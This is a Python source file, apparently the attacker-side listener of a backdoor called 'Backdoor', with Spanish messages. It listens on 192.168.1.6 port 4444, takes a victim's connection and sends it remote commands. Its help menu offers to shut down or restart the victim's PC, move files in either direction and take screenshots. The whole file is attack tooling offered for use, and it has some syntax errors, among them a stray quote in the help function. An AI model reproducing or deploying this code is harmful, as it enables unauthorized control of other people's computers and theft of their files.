#!/usr/bin/python
import socket
import json
import base64

def banner():
    print("""                                                                             
 _______    ______    ______   __    __  _______    ______    ______   _______   
|       \  /      \  /      \ |  \  /  \|       \  /      \  /      \ |       \  
| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$ /  $$| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$\ 
| $$__/ $$| $$__| $$| $$   \$$| $$/  $$ | $$  | $$| $$  | $$| $$  | $$| $$__| $$ 
| $$    $$| $$    $$| $$      | $$  $$  | $$  | $$| $$  | $$| $$  | $$| $$    $$ 
| $$$$$$$\| $$$$$$$$| $$   __ | $$$$$\  | $$  | $$| $$  | $$| $$  | $$| $$$$$$$\ 
| $$__/ $$| $$  | $$| $$__/  \| $$ \$$\ | $$__/ $$| $$__/ $$| $$__/ $$| $$  | $$ 
| $$    $$| $$  | $$ \$$    $$| $$  \$$\| $$    $$ \$$    $$ \$$    $$| $$  | $$ 
 \$$$$$$$  \$$   \$$  \$$$$$$  \$$   \$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$ 
                                                                                 
                                                                                 
            Tool by JkDevArg                                                                     

    """)

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperanco conexión")
        self.connection, address = listener.accept()
        print("[+] Conexión desde:" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "salir":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def descargar(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga Completa."

    def subir(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def ayuda(self):
        print('[#] ¡Lista de Información!\n') 
        print("--- Ayuda General ---") 
        print('[>] os | Muestra el sistema operativo)') 
        print('[>] cd | Cambia el directorio') 
        print('[>] ip | Muestra la IP local') 
        print('[>] host | Muestra el nombre del equipo') 
        print('[>] apagar | Apaga la PC de la victima') 
        print('[>] reiniciar | Hace que el equipo de destino se reinicie') 
        print('[>] descargar | Descarga el archivo cualquier archivo') 
        print('[>] subir | Carga cualquier archivo') 
        print('[>] captura de pantalla\n')'
        print('texto nuevo')


    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "subir":
                    file_content = self.subir(command[1])
                    command.append(file_content)

                resultado = self.execute_remotely(command)

                if command[0] == "descargar" and "[-] Error " not in resultado:
                    resultado = self.descargar(command[1], resultado)

                if command[0] == "ayuda":
                    self.ayuda()

            except Exception:
                resultado = "[-] Error al ejecutar comando."

            print(resultado)


banner()
my_listener = Listener("192.168.1.6", 4444)
my_listener.run()
